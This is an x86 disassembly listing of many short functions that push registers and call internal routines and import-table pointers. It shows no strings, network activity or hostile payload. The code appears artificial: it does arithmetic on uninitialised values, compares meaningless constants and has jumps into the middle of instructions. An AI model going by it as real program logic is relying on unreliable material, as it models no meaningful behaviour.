  4d1075:	sub    esp,0x54
  4d1078:	lea    ecx,[esi+0x1bc]
  4d107e:	or     edx,DWORD PTR [ecx-0xf4]
  4d1084:	push   ecx
  4d1085:	push   0x0
  4d1087:	call   0x4d1340
  4d108c:	add    esp,0x4
  4d108f:	pop    ecx
  4d1090:	push   ecx
  4d1091:	push   edi
  4d1092:	push   DWORD PTR [ecx+0x1b4]
  4d1098:	push   edx
  4d1099:	push   DWORD PTR [ecx+0x18]
  4d109c:	call   0x4d0704
  4d10a1:	add    esp,0x10
  4d10a4:	pop    ecx
  4d10a5:	push   ecx
  4d10a6:	push   0x0
  4d10a8:	call   0x4d0b20
  4d10ad:	add    esp,0x4
  4d10b0:	pop    ecx
  4d10b1:	add    esp,0x54
  4d10b4:	pop    ebp
  4d10b5:	ret    
  4d10b6:	add    BYTE PTR [eax],al
  4d10b8:	pop    edi
  4d10b9:	call   DWORD PTR ds:0x4d2020
  4d10bf:	call   edi
  4d10c1:	add    BYTE PTR [eax],al
  4d10c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10c9:	sub    esp,0x4c
  4d10cc:	lea    ebx,ds:0x4d3008
  4d10d2:	sub    esi,DWORD PTR [ebx+0x1d0]
  4d10d8:	push   ebx
  4d10d9:	push   ecx
  4d10da:	push   DWORD PTR [ebx+0x1d4]
  4d10e0:	push   edx
  4d10e1:	call   0x4d0dbc
  4d10e6:	add    esp,0xc
  4d10e9:	pop    ebx
  4d10ea:	mov    edi,0x0
  4d10ef:	push   edi
  4d10f0:	call   0x4d0e70
  4d10f5:	add    esp,0x4
  4d10f8:	call   0x4d06f8
  4d10fd:	add    esp,0x4
  4d1100:	add    esp,0x4c
  4d1103:	pop    ebp
  4d1104:	ret    
  4d1105:	add    BYTE PTR [eax],al
  4d1107:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d110d:	sub    esp,0x1c
  4d1110:	lea    edi,ds:0x4d3148
  4d1116:	mov    DWORD PTR [edi-0x120],ecx
  4d111c:	push   edi
  4d111d:	push   DWORD PTR [edi+0x8]
  4d1120:	push   eax
  4d1121:	push   DWORD PTR [edi+0x4c]
  4d1124:	push   DWORD PTR [edi+0xe4]
  4d112a:	call   0x4d10c4
  4d112f:	add    esp,0x10
  4d1132:	pop    edi
  4d1133:	push   edi
  4d1134:	call   0x4d06f8
  4d1139:	add    esp,0x4
  4d113c:	pop    edi
  4d113d:	push   edi
  4d113e:	mov    esi,0x0
  4d1143:	push   esi
  4d1144:	call   0x4d0c3c
  4d1149:	add    esp,0x4
  4d114c:	pop    edi
  4d114d:	add    esp,0x1c
  4d1150:	pop    ebp
  4d1151:	ret    
  4d1152:	add    BYTE PTR [eax],al
  4d1154:	mov    edi,edi
  4d1156:	push   ebp
  4d1157:	mov    ebp,esp
  4d1159:	sub    esp,0x2c
  4d115c:	lea    edi,ds:0x4d3058
  4d1162:	sub    eax,DWORD PTR [ebp-0xc]
  4d1165:	push   edi
  4d1166:	call   0x4d0ce4
  4d116b:	add    esp,0x4
  4d116e:	pop    edi
  4d116f:	push   edi
  4d1170:	push   esi
  4d1171:	push   DWORD PTR [edi+0x130]
  4d1177:	push   ebx
  4d1178:	push   esi
  4d1179:	call   0x4d0e24
  4d117e:	add    esp,0x10
  4d1181:	pop    edi
  4d1182:	push   edi
  4d1183:	push   0x0
  4d1185:	call   0x4d06ec
  4d118a:	add    esp,0x4
  4d118d:	pop    edi
  4d118e:	add    esp,0x2c
  4d1191:	pop    ebp
  4d1192:	ret    
  4d1193:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1199:	sub    esp,0x60
  4d119c:	lea    eax,ds:0x4d31f8
  4d11a2:	add    DWORD PTR [ebp-0x20],0x290e
  4d11a9:	push   eax
  4d11aa:	call   0x4d0ce4
  4d11af:	add    esp,0x4
  4d11b2:	pop    eax
  4d11b3:	push   eax
  4d11b4:	push   edi
  4d11b5:	push   DWORD PTR [eax+0x160]
  4d11bb:	push   ecx
  4d11bc:	push   edi
  4d11bd:	call   0x4d0c9c
  4d11c2:	add    esp,0x10
  4d11c5:	pop    eax
  4d11c6:	push   eax
  4d11c7:	mov    esi,0xfffffff4
  4d11cc:	push   esi
  4d11cd:	call   0x4d1000
  4d11d2:	add    esp,0x4
  4d11d5:	pop    eax
  4d11d6:	add    esp,0x60
  4d11d9:	pop    ebp
  4d11da:	ret    
  4d11db:	add    BYTE PTR [edi-0x1],bl
  4d11de:	adc    eax,0x4d2058
  4d11e3:	call   edi
  4d11e5:	add    BYTE PTR [eax],al
  4d11e7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11ed:	sub    esp,0x28
  4d11f0:	lea    esi,[edi+0x74]
  4d11f3:	cmp    esi,0x7b4d
  4d11f9:	jbe    0x4d11eb
  4d11fb:	mov    ebx,0x0
  4d1200:	push   ebx
  4d1201:	call   0x4d1064
  4d1206:	add    esp,0x4
  4d1209:	push   esi
  4d120a:	push   edi
  4d120b:	push   edi
  4d120c:	call   0x4d1154
  4d1211:	add    esp,0x8
  4d1214:	pop    esi
  4d1215:	push   0x0
  4d1217:	call   0x4d0b20
  4d121c:	add    esp,0x4
  4d121f:	add    esp,0x28
  4d1222:	pop    ebp
  4d1223:	ret    
  4d1224:	mov    edi,edi
  4d1226:	push   ebp
  4d1227:	mov    ebp,esp
  4d1229:	sub    esp,0x20
  4d122c:	mov    esi,0x4d3050
  4d1231:	cmp    esi,0x6c92
  4d1237:	je     0x4d1227
  4d1239:	mov    ebx,0x0
  4d123e:	push   ebx
  4d123f:	call   0x4d0f54
  4d1244:	add    esp,0x4
  4d1247:	push   esi
  4d1248:	push   eax
  4d1249:	push   DWORD PTR [esi+0x1e8]
  4d124f:	call   0x4d12f4
  4d1254:	add    esp,0x8
  4d1257:	pop    esi
  4d1258:	push   0x0
  4d125a:	call   0x4d0e70
  4d125f:	add    esp,0x4
  4d1262:	add    esp,0x20
  4d1265:	pop    ebp
  4d1266:	ret    
  4d1267:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d126d:	sub    esp,0x58
  4d1270:	mov    ecx,0x4d30b4
  4d1275:	sub    ebx,0xffffffd3
  4d1278:	push   ecx
  4d1279:	push   DWORD PTR [ecx+0x80]
  4d127f:	push   eax
  4d1280:	push   DWORD PTR [ecx+0x90]
  4d1286:	call   0x4d1444
  4d128b:	add    esp,0xc
  4d128e:	pop    ecx
  4d128f:	push   ecx
  4d1290:	push   0x0
  4d1292:	call   0x4d0f54
  4d1297:	add    esp,0x4
  4d129a:	pop    ecx
  4d129b:	push   ecx
  4d129c:	mov    edx,0x0
  4d12a1:	push   edx
  4d12a2:	call   0x4d0b20
  4d12a7:	add    esp,0x4
  4d12aa:	pop    ecx
  4d12ab:	add    esp,0x58
  4d12ae:	pop    ebp
  4d12af:	ret    
  4d12b0:	mov    edi,edi
  4d12b2:	push   ebp
  4d12b3:	mov    ebp,esp
  4d12b5:	sub    esp,0x34
  4d12b8:	mov    esi,0x4d3074
  4d12bd:	xor    ecx,ebx
  4d12bf:	mov    ecx,0x0
  4d12c4:	push   ecx
  4d12c5:	call   0x4d1064
  4d12ca:	add    esp,0x4
  4d12cd:	push   esi
  4d12ce:	push   edi
  4d12cf:	push   DWORD PTR [esi+0x1c8]
  4d12d5:	push   DWORD PTR [esi+0x180]
  4d12db:	call   0x4d09e8
  4d12e0:	add    esp,0xc
  4d12e3:	pop    esi
  4d12e4:	call   0x4d06f8
  4d12e9:	add    esp,0x4
  4d12ec:	add    esp,0x34
  4d12ef:	pop    ebp
  4d12f0:	ret    
  4d12f1:	add    BYTE PTR [eax],al
  4d12f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12f9:	sub    esp,0x50
  4d12fc:	mov    edx,0x4d30dc
  4d1301:	cmp    edx,0x5a3f
  4d1307:	jbe    0x4d12f7
  4d1309:	push   edx
  4d130a:	push   0x0
  4d130c:	call   0x4d0cf0
  4d1311:	add    esp,0x4
  4d1314:	pop    edx
  4d1315:	push   edx
  4d1316:	push   DWORD PTR [edx+0x9c]
  4d131c:	push   ecx
  4d131d:	push   DWORD PTR [edx+0x134]
  4d1323:	push   ebx
  4d1324:	call   0x4d0890
  4d1329:	add    esp,0x10
  4d132c:	pop    edx
  4d132d:	push   edx
  4d132e:	push   0x0
  4d1330:	call   0x4d0f54
  4d1335:	add    esp,0x4
  4d1338:	pop    edx
  4d1339:	add    esp,0x50
  4d133c:	pop    ebp
  4d133d:	ret    
  4d133e:	add    BYTE PTR [eax],al
  4d1340:	pop    edi
  4d1341:	call   DWORD PTR ds:0x4d2084
  4d1347:	call   edi
  4d1349:	add    BYTE PTR [eax],al
  4d134b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1351:	sub    esp,0x50
  4d1354:	lea    eax,ds:0x4d317c
  4d135a:	mov    esi,DWORD PTR [eax-0xd0]
  4d1360:	push   eax
  4d1361:	mov    ebx,0x0
  4d1366:	push   ebx
  4d1367:	call   0x4d0e70
  4d136c:	add    esp,0x4
  4d136f:	pop    eax
  4d1370:	push   eax
  4d1371:	push   edx
  4d1372:	push   edi
  4d1373:	push   DWORD PTR [eax+0x174]
  4d1379:	call   0x4d08e0
  4d137e:	add    esp,0xc
  4d1381:	pop    eax
  4d1382:	push   eax
  4d1383:	call   0x4d0ce4
  4d1388:	add    esp,0x4
  4d138b:	pop    eax
  4d138c:	add    esp,0x50
  4d138f:	pop    ebp
  4d1390:	ret    
  4d1391:	add    BYTE PTR [eax],al
  4d1393:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1399:	sub    esp,0x34
  4d139c:	lea    edi,ds:0x4d30fc
  4d13a2:	and    DWORD PTR [ebp-0x34],edi
  4d13a5:	push   edi
  4d13a6:	push   ecx
  4d13a7:	push   DWORD PTR [edi+0x108]
  4d13ad:	push   DWORD PTR [edi+0x1a0]
  4d13b3:	push   ebx
  4d13b4:	call   0x4d134c
  4d13b9:	add    esp,0x10
  4d13bc:	pop    edi
  4d13bd:	push   edi
  4d13be:	call   0x4d10b8
  4d13c3:	add    esp,0x4
  4d13c6:	pop    edi
  4d13c7:	push   edi
  4d13c8:	call   0x4d06f8
  4d13cd:	add    esp,0x4
  4d13d0:	pop    edi
  4d13d1:	add    esp,0x34
  4d13d4:	pop    ebp
  4d13d5:	ret    
  4d13d6:	add    BYTE PTR [eax],al
  4d13d8:	pop    edi
  4d13d9:	call   DWORD PTR ds:0x4d206c
  4d13df:	call   edi
  4d13e1:	add    BYTE PTR [eax],al
  4d13e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13e9:	sub    esp,0x30
  4d13ec:	mov    ecx,0x4d3198
  4d13f1:	adc    eax,esi
  4d13f3:	push   ecx
  4d13f4:	push   eax
  4d13f5:	push   DWORD PTR [ecx+0xb4]
  4d13fb:	push   DWORD PTR [ecx+0x1ec]
  4d1401:	call   0x4d0790
  4d1406:	add    esp,0xc
  4d1409:	pop    ecx
  4d140a:	push   ecx
  4d140b:	push   0x0
  4d140d:	call   0x4d0f54
  4d1412:	add    esp,0x4
  4d1415:	pop    ecx
  4d1416:	push   ecx
  4d1417:	mov    ecx,0xfffffff4
  4d141c:	push   ecx
  4d141d:	call   0x4d1000
  4d1422:	add    esp,0x4
  4d1425:	pop    ecx
  4d1426:	add    esp,0x30
  4d1429:	pop    ebp
  4d142a:	ret    
  4d142b:	add    BYTE PTR [edi-0x1],bl
  4d142e:	adc    eax,0x4d207c
  4d1433:	call   edi
  4d1435:	add    BYTE PTR [eax],al
  4d1437:	add    BYTE PTR [edi-0x1],bl
  4d143a:	adc    eax,0x4d201c
  4d143f:	call   edi
  4d1441:	add    BYTE PTR [eax],al
  4d1443:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1449:	sub    esp,0x50
  4d144c:	lea    ebx,[ecx-0x84]
  4d1452:	or     DWORD PTR [ebx+0x28],0xffff93a5
  4d1459:	push   ebx
  4d145a:	push   DWORD PTR [ebx+0x18c]
  4d1460:	push   eax
  4d1461:	call   0x4d12b0
  4d1466:	add    esp,0x8
  4d1469:	pop    ebx
  4d146a:	push   0x0
  4d146c:	call   0x4d0b20
  4d1471:	add    esp,0x4
  4d1474:	mov    edx,0x0
  4d1479:	push   edx
  4d147a:	call   0x4d1064
  4d147f:	add    esp,0x4
  4d1482:	add    esp,0x50
  4d1485:	pop    ebp
  4d1486:	ret    
  4d1487:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d148d:	sub    esp,0x60
  4d1490:	mov    eax,0x4d31f0
  4d1495:	cmp    eax,0x2d0c
  4d149a:	jb     0x4d148b
  4d149c:	push   eax
  4d149d:	mov    esi,0x0
  4d14a2:	push   esi
  4d14a3:	call   0x4d0e70
  4d14a8:	add    esp,0x4
  4d14ab:	pop    eax
  4d14ac:	push   eax
  4d14ad:	push   DWORD PTR [eax+0x1e0]
  4d14b3:	push   ebx
  4d14b4:	push   ebx
  4d14b5:	call   0x4d151c
  4d14ba:	add    esp,0xc
  4d14bd:	pop    eax
  4d14be:	push   eax
  4d14bf:	push   0x0
  4d14c1:	call   0x4d0f54
  4d14c6:	add    esp,0x4
  4d14c9:	pop    eax
  4d14ca:	add    esp,0x60
  4d14cd:	pop    ebp
  4d14ce:	ret    
  4d14cf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14d5:	sub    esp,0x54
  4d14d8:	lea    edi,[ecx+0x34]
  4d14db:	or     ecx,DWORD PTR [ebp-0xc]
  4d14de:	push   edi
  4d14df:	push   DWORD PTR [edi+0x50]
  4d14e2:	push   DWORD PTR [edi+0xa4]
  4d14e8:	push   ebx
  4d14e9:	push   esi
  4d14ea:	call   0x4d0f0c
  4d14ef:	add    esp,0x10
  4d14f2:	pop    edi
  4d14f3:	push   edi
  4d14f4:	mov    eax,0x0
  4d14f9:	push   eax
  4d14fa:	call   0x4d0cf0
  4d14ff:	add    esp,0x4
  4d1502:	pop    edi
  4d1503:	push   edi
  4d1504:	lea    edx,[edi-0x3c]
  4d1507:	push   edx
  4d1508:	call   0x4d1438
  4d150d:	add    esp,0x4
  4d1510:	test   eax,eax
  4d1512:	jne    0x4d1504
  4d1514:	pop    edi
  4d1515:	add    esp,0x54
  4d1518:	pop    ebp
  4d1519:	ret    
  4d151a:	add    BYTE PTR [eax],al
  4d151c:	mov    edi,edi
  4d151e:	push   ebp
  4d151f:	mov    ebp,esp
  4d1521:	sub    esp,0x34
  4d1524:	mov    esi,0x4d316c
  4d1529:	sub    edx,DWORD PTR [esi-0x144]
  4d152f:	push   esi
  4d1530:	push   DWORD PTR [esi+0x1e4]
  4d1536:	push   edx
  4d1537:	call   0x4d0b6c
  4d153c:	add    esp,0x8
  4d153f:	pop    esi
  4d1540:	push   0x0
  4d1542:	call   0x4d0930
  4d1547:	add    esp,0x4
  4d154a:	mov    eax,0x0
  4d154f:	push   eax
  4d1550:	call   0x4d1340
  4d1555:	add    esp,0x4
  4d1558:	add    esp,0x34
  4d155b:	pop    ebp
  4d155c:	ret    
  4d155d:	add    BYTE PTR [eax],al
  4d155f:	add    BYTE PTR [edi-0x1],bl
  4d1562:	adc    eax,0x4d2098
  4d1567:	call   edi
  4d1569:	add    BYTE PTR [eax],al
  4d156b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1571:	sub    esp,0x1c
  4d1574:	lea    edi,[ebx+0xc]
  4d1577:	cmp    edi,0x488b
  4d157d:	je     0x4d156f
  4d157f:	push   edi
  4d1580:	push   0x0
  4d1582:	call   0x4d0884
  4d1587:	add    esp,0x4
  4d158a:	pop    edi
  4d158b:	push   edi
  4d158c:	push   DWORD PTR [edi+0x188]
  4d1592:	push   esi
  4d1593:	call   0x4d093c
  4d1598:	add    esp,0x8
  4d159b:	pop    edi
  4d159c:	push   edi
  4d159d:	lea    ecx,[edi-0x1f8]
  4d15a3:	push   ecx
  4d15a4:	call   0x4d1438
  4d15a9:	add    esp,0x4
  4d15ac:	test   eax,eax
  4d15ae:	jne    0x4d159d
  4d15b0:	pop    edi
  4d15b1:	add    esp,0x1c
  4d15b4:	pop    ebp
  4d15b5:	ret    
	...
